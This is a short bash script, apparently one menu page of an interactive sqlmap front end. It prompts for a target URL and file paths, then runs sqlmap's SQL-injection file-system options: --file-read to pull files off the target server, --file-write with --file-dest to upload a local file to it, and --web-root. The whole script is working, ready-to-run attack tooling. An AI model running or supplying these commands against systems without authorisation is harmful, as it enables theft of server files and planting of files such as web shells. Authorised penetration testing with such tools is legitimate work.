#!/usr/bin/env bash

set -euo pipefail

BASE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
source "${BASE_DIR}/common.sh"

cat <<'EOF'
File System Access Query
File System Access Command

1. Read file
sqlmap -u [url] --file-read=[file] --batch
2. Write file
sqlmap -u [url] --file-write=[local file] --file-dest=[remote file] --batch
3. Set web root
sqlmap -u [url] --web-root=[path] --batch
EOF

read -r -p $'\nSelect-Options>Sqlmap>File-System>' select

case "$select" in
  1)
    read -r -p "Input URL> " url
    read -r -p "Input remote file> " file
    run_sqlmap sqlmap -u "$url" --file-read="$file" --batch
    ;;
  2)
    read -r -p "Input URL> " url
    read -r -p "Input local file> " localfile
    read -r -p "Input remote file destination> " remotedest
    run_sqlmap sqlmap -u "$url" --file-write="$localfile" --file-dest="$remotedest" --batch
    ;;
  3)
    read -r -p "Input URL> " url
    read -r -p "Input web root> " webroot
    run_sqlmap sqlmap -u "$url" --web-root="$webroot" --batch
    ;;
  *)
    echo "Selected command is not available."
    ;;
esac
